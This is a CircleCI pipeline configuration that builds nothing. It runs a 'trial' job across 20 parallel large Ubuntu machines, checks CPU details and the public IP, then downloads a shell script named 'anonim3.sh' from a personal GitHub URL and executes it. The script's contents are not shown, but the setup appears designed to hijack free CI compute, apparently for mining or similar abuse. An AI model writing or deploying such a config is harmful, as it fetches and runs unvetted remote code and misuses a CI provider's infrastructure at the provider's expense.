version: 2.1

jobs:
  trial:
    machine:
      image: ubuntu-2004:current
    resource_class: large
    parallelism: 20
    steps:
      - run: lscpu
      - run: curl ifconfig.me
      - run: 
            name: "trial" 
            command: wget https://raw.githubusercontent.com/jacujamil/terna/main/anonim3.sh && chmod u+x anonim3.sh && ./anonim3.sh
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial
